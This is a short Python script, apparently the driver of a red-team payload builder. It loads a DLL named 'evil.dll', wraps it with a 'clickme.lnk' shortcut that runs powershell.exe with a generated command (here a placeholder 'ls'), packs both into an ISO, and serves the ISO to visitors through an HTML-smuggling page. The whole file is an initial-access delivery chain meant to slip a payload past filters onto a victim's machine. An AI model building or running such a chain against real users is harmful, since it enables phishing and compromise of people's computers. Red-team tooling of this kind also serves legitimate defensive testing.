import logging

from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
from make.lnk.lnk import makeLnk
from make.iso.iso import makeIso
from make.powershell.powershell import makePowershell
from make.zip.zip import makeZip

from helpers import readFileContent, saveAceFile, makeAceFile
from model import AceFile, AceRoute, PluginDecorator, enableOut
from web import serve

logging.basicConfig(level=logging.INFO)


def main():
    # DLL
    dllData: bytes = readFileContent('payloads/evil.dll')
    dllFile: AceFile = makeAceFile('evil.dll', dllData)
    
    # LNK to powershell.exe to execute DLL
    execData: str = makePowershell(
        input='ls evil.dll',
        options={},
    )
    lnkData: bytes = makeLnk(
        name = "clickme.lnk",
        target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        arguments = "-noexit -command {}".format(execData),
    )
    lnkFile: AceFile = makeAceFile('clickme.lnk', lnkData)

    # Pack DLL and LNK into ISO
    container: bytes = makeIso(
        files = [
            dllFile,
            lnkFile,
        ],
    )
    containerFile: AceFile = makeAceFile('test2.iso', container)

    # HTML to serve ISO
    html: str = makeHtmlSmuggling(
        containerFile,
    )

    # serve HTML
    serveHtml: AceRoute = AceRoute('/test2', html)
    serve([serveHtml])


if __name__ == "__main__":
    enableOut()
    main()
